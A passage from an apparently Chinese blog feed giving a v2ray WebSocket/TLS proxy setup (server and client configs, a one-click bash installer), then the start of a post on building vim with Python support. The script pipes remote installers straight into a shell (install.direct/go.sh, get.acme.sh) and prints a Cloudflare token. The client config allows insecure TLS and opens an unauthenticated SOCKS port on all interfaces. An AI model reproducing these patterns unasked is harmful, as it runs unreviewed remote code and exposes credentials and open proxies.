class="hljs-string">&quot;streamSettings&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;network&quot;</span>: <span class="hljs-string">&quot;ws&quot;</span>,<br>      <span class="hljs-string">&quot;wsSettings&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/ws&quot;</span>   <br>      &#125;<br>    &#125;<br>  &#125;],<br>  <span class="hljs-string">&quot;outbounds&quot;</span>: [&#123;<br>    <span class="hljs-string">&quot;protocol&quot;</span>: <span class="hljs-string">&quot;freedom&quot;</span>,<br>    <span class="hljs-string">&quot;settings&quot;</span>: &#123;&#125;<br>  &#125;,&#123;<br>    <span class="hljs-string">&quot;protocol&quot;</span>: <span class="hljs-string">&quot;blackhole&quot;</span>,<br>    <span class="hljs-string">&quot;settings&quot;</span>: &#123;&#125;,<br>    <span class="hljs-string">&quot;tag&quot;</span>: <span class="hljs-string">&quot;blocked&quot;</span><br>  &#125;],<br>  <span class="hljs-string">&quot;routing&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;rules&quot;</span>: [<br>      &#123;<br>        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;field&quot;</span>,<br>        <span class="hljs-string">&quot;ip&quot;</span>: [<span class="hljs-string">&quot;geoip:private&quot;</span>],<br>        <span class="hljs-string">&quot;outboundTag&quot;</span>: <span class="hljs-string">&quot;blocked&quot;</span><br>      &#125;<br>    ]<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>其中 <code>id</code>通过 <code>cat /proc/sys/kernel/random/uuid</code>分配</p>
<h4 id="client"><a class="markdownIt-Anchor" href="#client"></a> Client</h4>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&#123;<br>    <span class="hljs-string">&quot;dns&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;servers&quot;</span>: [<br>            <span class="hljs-string">&quot;8.8.4.4&quot;</span>,<br>            <span class="hljs-string">&quot;1.1.1.1&quot;</span>,<br>            <span class="hljs-string">&quot;8.8.8.8&quot;</span>,<br>            <span class="hljs-string">&quot;114.114.114.114&quot;</span><br>        ]<br>    &#125;,<br>    <span class="hljs-string">&quot;inbounds&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;listen&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>            <span class="hljs-string">&quot;port&quot;</span>: 15490,<br>            <span class="hljs-string">&quot;protocol&quot;</span>: <span class="hljs-string">&quot;dokodemo-door&quot;</span>,<br>            <span class="hljs-string">&quot;settings&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;address&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;sniffing&quot;</span>: &#123;<br>            &#125;<br>        &#125;,<br>        &#123;<br>            <span class="hljs-string">&quot;listen&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>,<br>            <span class="hljs-string">&quot;port&quot;</span>: 8888,<br>            <span class="hljs-string">&quot;protocol&quot;</span>: <span class="hljs-string">&quot;http&quot;</span>,<br>            <span class="hljs-string">&quot;settings&quot;</span>: &#123;<br>            &#125;,<br>            <span class="hljs-string">&quot;sniffing&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;enabled&quot;</span>: <span class="hljs-literal">false</span><br>            &#125;<br>        &#125;,<br>        &#123;<br>            <span class="hljs-string">&quot;listen&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>,<br>            <span class="hljs-string">&quot;port&quot;</span>: 1088,<br>            <span class="hljs-string">&quot;protocol&quot;</span>: <span class="hljs-string">&quot;socks&quot;</span>,<br>            <span class="hljs-string">&quot;settings&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;auth&quot;</span>: <span class="hljs-string">&quot;noauth&quot;</span>,<br>                <span class="hljs-string">&quot;userLevel&quot;</span>: 0<br>            &#125;,<br>            <span class="hljs-string">&quot;sniffing&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;enabled&quot;</span>: <span class="hljs-literal">false</span><br>            &#125;<br>        &#125;<br>    ],<br>    <span class="hljs-string">&quot;log&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;loglevel&quot;</span>: <span class="hljs-string">&quot;warning&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;outbounds&quot;</span>: [<br>        &#123;<br><br>            <span class="hljs-string">&quot;protocol&quot;</span>: <span class="hljs-string">&quot;vmess&quot;</span>,<br>            <span class="hljs-string">&quot;sendThrough&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>,<br>            <span class="hljs-string">&quot;settings&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;vnext&quot;</span>: [<br>                    &#123;<br>                        <span class="hljs-string">&quot;address&quot;</span>: <span class="hljs-string">&quot;域名&quot;</span>,<br>                        <span class="hljs-string">&quot;port&quot;</span>: 443,<br>                        <span class="hljs-string">&quot;users&quot;</span>: [<br>                            &#123;<br>                                <span class="hljs-string">&quot;alterId&quot;</span>: 64,<br>                                <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;服务器UUID&quot;</span>,<br>                                <span class="hljs-string">&quot;level&quot;</span>: 0,<br>                                <span class="hljs-string">&quot;security&quot;</span>: <span class="hljs-string">&quot;none&quot;</span><br>                            &#125;<br>                        ]<br>                    &#125;<br>                ]<br>            &#125;,<br>            <span class="hljs-string">&quot;streamSettings&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;dsSettings&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/&quot;</span><br>                &#125;,<br>                <span class="hljs-string">&quot;httpSettings&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;host&quot;</span>: [<br>                    ],<br>                    <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/&quot;</span><br>                &#125;,<br>                <span class="hljs-string">&quot;kcpSettings&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;congestion&quot;</span>: <span class="hljs-literal">false</span>,<br>                    <span class="hljs-string">&quot;downlinkCapacity&quot;</span>: 100,<br>                    <span class="hljs-string">&quot;header&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;none&quot;</span><br>                    &#125;,<br>                    <span class="hljs-string">&quot;mtu&quot;</span>: 1350,<br>                    <span class="hljs-string">&quot;readBufferSize&quot;</span>: 1,<br>                    <span class="hljs-string">&quot;tti&quot;</span>: 24,<br>                    <span class="hljs-string">&quot;uplinkCapacity&quot;</span>: 5,<br>                    <span class="hljs-string">&quot;writeBufferSize&quot;</span>: 1<br>                &#125;,<br>                <span class="hljs-string">&quot;network&quot;</span>: <span class="hljs-string">&quot;ws&quot;</span>,<br>                <span class="hljs-string">&quot;quicSettings&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;header&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;none&quot;</span><br>                    &#125;,<br>                    <span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                    <span class="hljs-string">&quot;security&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>                &#125;,<br>                <span class="hljs-string">&quot;security&quot;</span>: <span class="hljs-string">&quot;tls&quot;</span>,<br>                <span class="hljs-string">&quot;sockopt&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;mark&quot;</span>: 0,<br>                    <span class="hljs-string">&quot;tcpFastOpen&quot;</span>: <span class="hljs-literal">false</span>,<br>                    <span class="hljs-string">&quot;tproxy&quot;</span>: <span class="hljs-string">&quot;off&quot;</span><br>                &#125;,<br>                <span class="hljs-string">&quot;tcpSettings&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;header&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;request&quot;</span>: &#123;<br>                            <span class="hljs-string">&quot;headers&quot;</span>: &#123;<br>                            &#125;,<br>                            <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;GET&quot;</span>,<br>                            <span class="hljs-string">&quot;path&quot;</span>: [<br>                            ],<br>                            <span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;1.1&quot;</span><br>                        &#125;,<br>                        <span class="hljs-string">&quot;response&quot;</span>: &#123;<br>                            <span class="hljs-string">&quot;headers&quot;</span>: &#123;<br>                            &#125;,<br>                            <span class="hljs-string">&quot;reason&quot;</span>: <span class="hljs-string">&quot;OK&quot;</span>,<br>                            <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;200&quot;</span>,<br>                            <span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;1.1&quot;</span><br>                        &#125;,<br>                        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;none&quot;</span><br>                    &#125;<br>                &#125;,<br>                <span class="hljs-string">&quot;tlsSettings&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;allowInsecure&quot;</span>: <span class="hljs-literal">true</span>,<br>                    <span class="hljs-string">&quot;allowInsecureCiphers&quot;</span>: <span class="hljs-literal">false</span>,<br>                    <span class="hljs-string">&quot;alpn&quot;</span>: [<br>                    ],<br>                    <span class="hljs-string">&quot;certificates&quot;</span>: [<br>                    ],<br>                    <span class="hljs-string">&quot;disableSystemRoot&quot;</span>: <span class="hljs-literal">false</span>,<br>                    <span class="hljs-string">&quot;serverName&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>                &#125;,<br>                <span class="hljs-string">&quot;wsSettings&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;headers&quot;</span>: &#123;<br>                    &#125;,<br>                    <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/ws&quot;</span><br>                &#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;tag&quot;</span>: <span class="hljs-string">&quot;server&quot;</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-string">&quot;protocol&quot;</span>: <span class="hljs-string">&quot;freedom&quot;</span>,<br>            <span class="hljs-string">&quot;sendThrough&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>,<br>            <span class="hljs-string">&quot;settings&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;domainStrategy&quot;</span>: <span class="hljs-string">&quot;AsIs&quot;</span>,<br>                <span class="hljs-string">&quot;redirect&quot;</span>: <span class="hljs-string">&quot;:0&quot;</span>,<br>                <span class="hljs-string">&quot;userLevel&quot;</span>: 0<br>            &#125;,<br>            <span class="hljs-string">&quot;streamSettings&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;kcpSettings&quot;</span>: &#123;<br>                &#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;tag&quot;</span>: <span class="hljs-string">&quot;outBound_DIRECT&quot;</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-string">&quot;protocol&quot;</span>: <span class="hljs-string">&quot;blackhole&quot;</span>,<br>            <span class="hljs-string">&quot;sendThrough&quot;</span>: <span class="hljs-string">&quot;0.0.0.0&quot;</span>,<br>            <span class="hljs-string">&quot;settings&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;response&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;none&quot;</span><br>                &#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;streamSettings&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;kcpSettings&quot;</span>: &#123;<br>                &#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;tag&quot;</span>: <span class="hljs-string">&quot;outBound_BLACKHOLE&quot;</span><br>        &#125;<br>    ],<br>    <span class="hljs-string">&quot;policy&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;system&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;statsInboundDownlink&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;statsInboundUplink&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;statsOutboundDownlink&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;statsOutboundUplink&quot;</span>: <span class="hljs-literal">true</span><br>        &#125;<br>    &#125;,<br>    <span class="hljs-string">&quot;routing&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;domainStrategy&quot;</span>: <span class="hljs-string">&quot;AsIs&quot;</span>,<br>        <span class="hljs-string">&quot;rules&quot;</span>: [<br>            &#123;<br>                <span class="hljs-string">&quot;ip&quot;</span>: [<br>                    <span class="hljs-string">&quot;geoip:private&quot;</span><br>                ],<br>                <span class="hljs-string">&quot;outboundTag&quot;</span>: <span class="hljs-string">&quot;outBound_DIRECT&quot;</span>,<br>                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;field&quot;</span><br>            &#125;,<br>            &#123;<br>                <span class="hljs-string">&quot;ip&quot;</span>: [<br>                    <span class="hljs-string">&quot;geoip:cn&quot;</span><br>                ],<br>                <span class="hljs-string">&quot;outboundTag&quot;</span>: <span class="hljs-string">&quot;outBound_DIRECT&quot;</span>,<br>                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;field&quot;</span><br>            &#125;,<br>            &#123;<br>                <span class="hljs-string">&quot;domain&quot;</span>: [<br>                    <span class="hljs-string">&quot;geosite:cn&quot;</span><br>                ],<br>                <span class="hljs-string">&quot;outboundTag&quot;</span>: <span class="hljs-string">&quot;outBound_DIRECT&quot;</span>,<br>                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;field&quot;</span><br>            &#125;<br>        ]<br>    &#125;,<br>    <span class="hljs-string">&quot;stats&quot;</span>: &#123;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>
<h3 id="一键配置脚本"><a class="markdownIt-Anchor" href="#一键配置脚本"></a> 一键配置脚本</h3>
<p>整个过程用bash脚本处理</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># 域名，自行修改</span><br><span class="hljs-built_in">export</span> DOMAIN=<br><span class="hljs-built_in">export</span> UUID=$(cat /proc/sys/kernel/random/uuid)<br><span class="hljs-comment"># cloudflare中创建的token，自行修改</span><br><span class="hljs-built_in">export</span> CF_Token=<span class="hljs-string">&quot;&quot;</span><br><br>curl -X GET <span class="hljs-string">&quot;https://api.cloudflare.com/client/v4/user/tokens/verify&quot;</span> \<br>     -H <span class="hljs-string">&quot;Authorization: Bearer <span class="hljs-variable">$&#123;CF_Token&#125;</span>&quot;</span> \<br>     -H <span class="hljs-string">&quot;Content-Type:application/json&quot;</span><br><br>apt install curl wget -y <br>apt install socat -y<br>apt install nginx -y<br><br>bash &lt;(curl -L -s https://install.direct/go.sh)<br>cat &lt;&lt;<span class="hljs-string">EOF&gt;/etc/v2ray/config.json</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  &quot;inbounds&quot;: [&#123;</span><br><span class="hljs-string">    &quot;port&quot;: 10086,           </span><br><span class="hljs-string">    &quot;listen&quot;:&quot;127.0.0.1&quot;,</span><br><span class="hljs-string">    &quot;protocol&quot;: &quot;vmess&quot;,</span><br><span class="hljs-string">    &quot;settings&quot;: &#123;</span><br><span class="hljs-string">      &quot;clients&quot;: [</span><br><span class="hljs-string">        &#123;</span><br><span class="hljs-string">          &quot;id&quot;: &quot;$&#123;UUID&#125;&quot;, </span><br><span class="hljs-string">          &quot;level&quot;: 1,</span><br><span class="hljs-string">          &quot;alterId&quot;: 64      </span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">      ]</span><br><span class="hljs-string">    &#125;,</span><br><span class="hljs-string">    &quot;streamSettings&quot;: &#123;</span><br><span class="hljs-string">      &quot;network&quot;: &quot;ws&quot;,</span><br><span class="hljs-string">      &quot;wsSettings&quot;: &#123;</span><br><span class="hljs-string">        &quot;path&quot;: &quot;/ws&quot;   </span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">  &#125;],</span><br><span class="hljs-string">  &quot;outbounds&quot;: [&#123;</span><br><span class="hljs-string">    &quot;protocol&quot;: &quot;freedom&quot;,</span><br><span class="hljs-string">    &quot;settings&quot;: &#123;&#125;</span><br><span class="hljs-string">  &#125;,&#123;</span><br><span class="hljs-string">    &quot;protocol&quot;: &quot;blackhole&quot;,</span><br><span class="hljs-string">    &quot;settings&quot;: &#123;&#125;,</span><br><span class="hljs-string">    &quot;tag&quot;: &quot;blocked&quot;</span><br><span class="hljs-string">  &#125;],</span><br><span class="hljs-string">  &quot;routing&quot;: &#123;</span><br><span class="hljs-string">    &quot;rules&quot;: [</span><br><span class="hljs-string">      &#123;</span><br><span class="hljs-string">        &quot;type&quot;: &quot;field&quot;,</span><br><span class="hljs-string">        &quot;ip&quot;: [&quot;geoip:private&quot;],</span><br><span class="hljs-string">        &quot;outboundTag&quot;: &quot;blocked&quot;</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-comment"># yum -y update</span><br><span class="hljs-comment"># yum -y install epel-release</span><br><span class="hljs-comment"># yum -y install nginx</span><br><br>systemctl <span class="hljs-built_in">enable</span> v2ray<br>systemctl restart v2ray<br><br>mkdir /etc/nginx/ssl <br>mv /etc/nginx/conf.d/default.conf /etc/nginx/conf.d/default.conf.back  <br>cat &lt;&lt;<span class="hljs-string">EOF&gt;/etc/nginx/conf.d/default.conf</span><br><span class="hljs-string">server &#123;</span><br><span class="hljs-string">    listen       443 ssl;</span><br><span class="hljs-string">    server_name  $&#123;DOMAIN&#125;;</span><br><span class="hljs-string">    ssl_certificate ssl/$&#123;DOMAIN&#125;.crt;       </span><br><span class="hljs-string">    ssl_certificate_key ssl/$&#123;DOMAIN&#125;.key;   </span><br><span class="hljs-string"> </span><br><span class="hljs-string">    location /ws &#123;                         </span><br><span class="hljs-string">        proxy_redirect off;</span><br><span class="hljs-string">        proxy_pass http://127.0.0.1:10086;       </span><br><span class="hljs-string">        proxy_http_version 1.1;</span><br><span class="hljs-string">        proxy_set_header Upgrade \$http_upgrade;</span><br><span class="hljs-string">        proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="hljs-string">        proxy_set_header Host \$http_host;</span><br><span class="hljs-string">        proxy_set_header X-Real-IP \$remote_addr;</span><br><span class="hljs-string">        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;</span><br><span class="hljs-string">        proxy_connect_timeout 60s;</span><br><span class="hljs-string">        proxy_read_timeout 86400s;</span><br><span class="hljs-string">        proxy_send_timeout 60s;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>systemctl stop nginx<br>systemctl <span class="hljs-built_in">enable</span> nginx<br><br>mv ~/.acme.sh ~/.acme.sh.back <br>curl  https://get.acme.sh | sh<br><span class="hljs-built_in">source</span> ~/.bashrc<br><span class="hljs-built_in">cd</span> ~/.acme.sh<br>./acme.sh --issue --dns dns_cf -d <span class="hljs-variable">$&#123;DOMAIN&#125;</span> --standalone -k ec-256<br>cat <span class="hljs-variable">$&#123;DOMAIN&#125;</span>_ecc/fullchain.cer &gt;/etc/nginx/ssl/<span class="hljs-variable">$&#123;DOMAIN&#125;</span>.crt<br>cat <span class="hljs-variable">$&#123;DOMAIN&#125;</span>_ecc/<span class="hljs-variable">$&#123;DOMAIN&#125;</span>.key&gt;/etc/nginx/ssl/<span class="hljs-variable">$&#123;DOMAIN&#125;</span>.key<br>systemctl restart nginx<br>./acme.sh --installcert -d <span class="hljs-variable">$&#123;DOMAIN&#125;</span> -d *.<span class="hljs-variable">$&#123;DOMAIN&#125;</span> \<br>          --fullchainpath /etc/nginx/ssl/<span class="hljs-variable">$&#123;DOMAIN&#125;</span>.crt \<br>          --keypath /etc/nginx/ssl/<span class="hljs-variable">$&#123;DOMAIN&#125;</span>.key \<br>          --reloadcmd <span class="hljs-string">&quot;systemctl force-reload nginx&quot;</span> \<br>          --ecc<br><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;DOMAIN: &quot;</span> =&gt; <span class="hljs-variable">$&#123;DOMAIN&#125;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;UUID: &quot;</span> =&gt; <span class="hljs-variable">$&#123;UUID&#125;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;CF_Token: &quot;</span> =&gt; <span class="hljs-variable">$&#123;CF_Token&#125;</span><br><br></code></pre></div></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>v2ray</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim支持Python2/Python3</title>
    <url>/vim-support-python/</url>
    <content><![CDATA[<p>Archlinux安装vim是默认应该是支持Python2和Python3的，而Ubuntu等若直接安装vim则只支持Python3。那么这样的话vim就无法使用YCM插件了，因此本文介绍从源代码安装vim支持以Python2和Python3。</p>
<span id="more"></span>
<h3 id="查看vim是否支持python"><a class="markdownIt-Anchor" href="#查看vim是否支持python"></a> 查看vim是否支持Python</h3>
<p>用如下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">vim --version<br></code></pre></div></td></tr></table></figure>
<p>若显示一下，则表示默认不支持。</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-python/dyn<br>+python3/dyn <br></code></pre></div></td></tr></table></figure>
<h3 id="编译vim源代码安装vim"><a class="markdownIt-Anchor" href="#编译vim源代码安装vim"></a> 编译vim源代码，安装vim</h3>
